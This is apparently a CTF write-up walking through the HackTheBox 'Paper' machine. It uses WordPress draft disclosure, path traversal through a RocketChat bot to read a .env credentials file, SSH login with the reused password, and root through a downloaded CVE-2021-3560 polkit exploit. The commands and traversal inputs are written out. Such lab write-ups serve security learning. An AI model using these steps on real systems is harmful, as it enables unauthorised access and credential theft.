---
title: "Walk-through of Paper from HackTheBox"
header:
  teaser: /assets/images/2022-02-06-16-18-09.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Wordpress
  - Feroxbuster
  - Searchsploit
  - Rocketchat
  - CVE-2021-3560
  - Pwnkit
---

## Machine Information

![paper](/assets/images/2022-02-06-16-18-09.png)

Paper is an easy machine on HackTheBox. It's loosely themed around the American version of Office the TV series. We start by enumerating to find a domain, which leads us to a Wordpress site and a public exploit is used to reveal hidden drafts. From there we find a chat server on a subdomain and a registration URL gives us a way to gain access. Interacting with a bot on RocketChat allows us to use path traversal to read files outside of the intended area. Eventually we find credentials for SSH access, and root is obtained by using a Pwnkit exploit.

<!--more-->

Skills required are basic web and OS enumeration. Skills learned are using public exploits, and leveraging them.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Paper](https://www.hackthebox.com/home/machines/profile/429) |
| Machine Release Date | 5th February 2022 |
| Date I Completed It | 7th February 2022 |
| Distribution Used | Kali 2021.4 – [Release Info](https://www.kali.org/blog/kali-linux-2021-4-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/paper]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.143 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/paper]
└─# nmap -p$ports -sC -sV -oA paper 10.10.11.143
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-06 16:18 GMT
Nmap scan report for 10.10.11.143
Host is up (0.025s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.62 seconds
```

## Webserver

Start with the webserver. Port 80 and 443 take us to the same test page:

![paper-test-page](/assets/images/2022-02-06-16-40-49.png)

## X-Backend-Server

Looking at headers with curl X-Backend-Server is set as office.paper:

```sh
┌──(root💀kali)-[~/htb/paper]
└─# curl -s -v http://10.10.11.143 >/dev/null
*   Trying 10.10.11.143:80...
* Connected to 10.10.11.143 (10.10.11.143) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.11.143
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< Date: Sun, 06 Feb 2022 16:36:56 GMT
< Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
< X-Backend-Server: office.paper
< Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
< ETag: "30c0b-5c5c7fdeec240"
< Accept-Ranges: bytes
< Content-Length: 199691
< Content-Type: text/html; charset=UTF-8
< 
{ [954 bytes data]
* Connection #0 to host 10.10.11.143 left intact
```

Add that to our hosts file:

```sh
┌──(root💀kali)-[~/htb/paper]
└─# echo "10.10.11.143 office.paper" >> /etc/hosts
```

## Office Website

Now visit the URL:

![paper-website](/assets/images/2022-02-06-16-44-58.png)

There's nothing of interest on the site apart from this post, and the comment for it:

![paper-feeling-alone](/assets/images/2022-02-06-16-46-16.png)

Nick is telling the admin to remove his draft.

## Wordpress Exploit

If you look at the source code for the page you can see this is a WordPress site. We could also check using Feroxbuster:

```sh
┌──(root💀kali)-[~/htb/paper]
└─# feroxbuster --url http://office.paper                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://office.paper
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301        7l       20w      239c http://office.paper/wp-content
301        7l       20w      237c http://office.paper/wp-admin
301        7l       20w      240c http://office.paper/wp-includes
<SNIP>
```

[This](https://smartwp.com/check-wordpress-version/) shows you what too look for to get the version number:

```sh
┌──(root💀kali)-[~/htb/paper]
└─# curl -s http://office.paper | grep "generator"
<meta name="generator" content="WordPress 5.2.3" />
```

## Searchsploit

Now use searchsploit to look for a vulnerability:

```sh
┌──(root💀kali)-[~/htb/paper]
└─# searchsploit wordpress 5.2.3
-------------------------------------------------------------------------- ---------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------
WordPress Core 5.2.3 - Cross-Site Host Modification                       | php/webapps/47361.pl
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts   | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                   | php/dos/47800.py
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities       | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                 | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection               | php/webapps/48918.sh
-------------------------------------------------------------------------- ---------------------------
```

Second one down is what we are looking for:

```sh
┌──(root💀kali)-[~/htb/paper]
└─# searchsploit -m multiple/webapps/47690.md
  Exploit: WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts
      URL: https://www.exploit-db.com/exploits/47690
     Path: /usr/share/exploitdb/exploits/multiple/webapps/47690.md
File Type: ASCII text
Copied to: /root/htb/paper/47690.md

┌──(root💀kali)-[~/htb/paper]
└─# cat 47690.md                      
So far we know that adding `?static=1` to a wordpress URL should leak its secret content
Here are a few ways to manipulate the returned entries:
- `order` with `asc` or `desc`
- `orderby`
- `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date format
In this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1&order=asc` will show the secret content:
```

## Html2text

We can just put static=1 as a parameter to view the secret. Use html2text to make it more readable in the terminal:

```sh
┌──(root💀kali)-[~/htb/paper]
└─# apt install html2text             
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
html2text is already the newest version (1.3.2a-28).
0 upgraded, 0 newly installed, 0 to remove and 135 not upgraded.
```

## Viewing Wordpress Draft

Now grab the secret with curl and pass to html2text to read it:

```sh
┌──(root💀kali)-[~/htb/paper]
└─# curl -s http://office.paper/?static=1 | html2text
Skip_to_content
[Blunder_Tiffin_Inc.]
******_Blunder_Tiffin_Inc._******
The_best_paper_company_in_the_electric-city_Scranton!
<SNIP>
# Warning for Michael
Michael, you have to stop putting secrets in the drafts. It is a huge security
issue and you have to stop doing it. -Nick
Threat Level Midnight
A MOTION PICTURE SCREENPLAY,
WRITTEN AND DIRECTED BY
MICHAEL SCOTT
[INT:DAY]
Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His
robotic butler Dwigt….
# Secret Registration URL of new Employee chat system
http://chat.office.paper/register/8qozr226AhkCHZdyY
# I am keeping this draft unpublished, as unpublished drafts cannot be accessed
by outsiders. I am not that ignorant, Nick.
# Also, stop looking at my drafts. Jeez!
<SNIP>
```

We could have scanned for vhosts to find that sub domain as well:

```sh
┌──(root💀kali)-[~/htb/paper]
└─# gobuster vhost -t 100 -k -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://office.paper
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://office.paper
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/02/06 16:47:28 Starting gobuster in VHOST enumeration mode
===============================================================
Found: chat.office.paper (Status: 200) [Size: 223163]
<SNIP>
```

## Rocketchat

Let's try that registration URL in our browser:

![paper-rocketchat-register](/assets/images/2022-02-06-20-13-21.png)

Register a new account and choose username:

![paper-rocketchat-name](/assets/images/2022-02-06-20-17-12.png)

We end up here:

![paper-rocketchat-dash](/assets/images/2022-02-06-20-17-59.png)

The only chat available if general, click on that to see the discussion:

![paper-rocketchat-general](/assets/images/2022-02-06-20-21-25.png)

Click on recyclops and then message to get to a chat with the bot:

![paper-rocketchat-recyclops](/assets/images/2022-02-06-20-40-52.png)

This bot is based on [hubot](https://hubot.github.com/). If I type list I see the contents of the sales folder:

```text
list

Fetching the directory listing of /sales/
drwxr-xr-x 2 dwight dwight 27 Sep 15 13:03 sale
drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2
```

There's nothing interesting here, but you can do path traversal to see other folders:

```text
list sale/../../../../

Fetching the directory listing of sale/../../../../
-rw-r--r-- 1 root root 0 Jan 14 06:07 .autorelabel
lrwxrwxrwx 1 root root 7 Jun 22 2021 bin -> usr/bin
dr-xr-xr-x. 4 root root 4096 Jan 14 06:46 boot
drwxr-xr-x 20 root root 3020 Feb 6 09:40 dev
drwxr-xr-x. 145 root root 8192 Feb 6 09:40 etc
drwxr-xr-x. 3 root root 20 Jan 14 06:50 home
lrwxrwxrwx 1 root root 7 Jun 22 2021 lib -> usr/lib
lrwxrwxrwx. 1 root root 9 Jun 22 2021 lib64 -> usr/lib64
drwxr-xr-x. 2 root root 6 Jun 22 2021 media
drwxr-xr-x. 3 root root 18 Jun 22 2021 mnt<
<SNIP>
```

If you look in Dwight's home you'll see a folder called hubot:

```text
list sale/../../../../home/dwight

Fetching the directory listing of sale/../../../../home/dwight
<SNIP>
-rwxr-xr-x 1 dwight dwight 1174 Sep 16 06:58 bot_restart.sh
drwx------ 8 dwight dwight 4096 Sep 16 07:57 hubot
-rw-rw-r-- 1 dwight dwight 18 Sep 16 07:24 .hubot_history
```

Looking in the hubot folder we have a number of files:

```text
list sale/../../hubot/

Fetching the directory listing of sale/../../hubot/
drwx--x--x 2 dwight dwight 36 Sep 16 07:34 bin
-rw-r--r-- 1 dwight dwight 258 Sep 16 07:57 .env
-rwxr-xr-x 1 dwight dwight 2 Jul 3 2021 external-scripts.json
drwx------ 8 dwight dwight 163 Jul 3 2021 .git
-rw-r--r-- 1 dwight dwight 917 Jul 3 2021 .gitignore
-rw-r--r-- 1 dwight dwight 296856 Feb 6 15:01 .hubot.log
```

We can see the contents of files using the command file instead of list. This is the contents of the .env file we can see in the folder:

```text
file sale/../../hubot/.env

<!=====Contents of file sale/../../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====End of file sale/../../hubot/.env=====>
```

## SSH Access

We have some credentials, and find that they are reused by dwight for his SSH access:

```sh
┌──(root💀kali)-[~/htb/paper]
└─# ssh dwight@office.paper                  
dwight@office.paper's password: 
Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ 
```

## User Flag

Let's grab the user flag before we have a look around:

```text
[dwight@paper ~]$ cat user.txt 
dfb5f17e111d79a99eeaf8cca1f17188
```

## CVE-2021-3560

After a fair bit of looking around I found the path to root was interesting on this box. Maybe I missed a clue or didn't follow the intended path, but I found CVE-2021-3560 which is another polkit exploit worked.

Vulnerable versions of polkit are listed in [this script](https://access.redhat.com/security/vulnerabilities/RHSB-2022-001). We can check the version on the box:

```text
[dwight@paper ~]$ pkaction --version 
pkaction version 0.115
```

From that RedHat list we know this is vulnerable. I searched on GitHub and found [this](https://github.com/Almorabea/Polkit-exploit) exploit. Switch to Kali and grab it:

```sh
┌──(root💀kali)-[~/htb/paper]
└─# wget https://raw.githubusercontent.com/Almorabea/Polkit-exploit/main/CVE-2021-3560.py
--2022-02-07 17:12:37--  https://raw.githubusercontent.com/Almorabea/Polkit-exploit/main/CVE-2021-3560.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.13...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2434 (2.4K) [text/plain]
Saving to: ‘CVE-2021-3560.py’
CVE-2021-3560.py  100%[=====================================================>]   2.38K  --.-KB/s    in 0s
2022-02-07 17:12:37 (7.27 MB/s) - ‘CVE-2021-3560.py’ saved [2434/2434]
```

Start a web server on Kali so we can pull the file across:

```sh
┌──(root💀kali)-[~/htb/paper]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Switch to the box and pull the exploit over:

```sh
[dwight@paper ~]$ wget http://10.10.14.12/CVE-2021-3560.py
--2022-02-07 12:15:21--  http://10.10.14.12/CVE-2021-3560.py
Connecting to 10.10.14.12:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2434 (2.4K) [text/x-python]
Saving to: ‘CVE-2021-3560.py’
CVE-2021-3560.py   100%[======>]   2.38K  --.-KB/s    in 0s      
2022-02-07 12:15:21 (138 MB/s) - ‘CVE-2021-3560.py’ saved [2434/2434]
```

## Root Flag

Now run the exploit to become root:

```text
[dwight@paper ~]$ python3 CVE-2021-3560.py 
**************
Exploit: Privilege escalation with polkit - CVE-2021-3560
Exploit code written by Ahmad Almorabea @almorabea
Original exploit author: Kevin Backhouse 
For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
**************
[+] Starting the Exploit 
id: ‘ahmed’: no such user
id: ‘ahmed’: no such user
id: ‘ahmed’: no such user
[+] User Created with the name of ahmed
[+] Timed out at: 0.008090460803153968
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
[+] Timed out at: 0.008392264349843527
[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root 
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:
    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.
bash: cannot set terminal process group (4354): Inappropriate ioctl for device
bash: no job control in this shell
[root@paper dwight]#
```

And as simple as that we are root:

```text
[root@paper dwight]# id
uid=0(root) gid=0(root) groups=0(root)
```

Let's grab the flag to complete the box:

```text
[root@paper dwight]# cat /root/root.txt
8d8bc5dac670529de3817ee328ce64a7
```

All done. See you next time
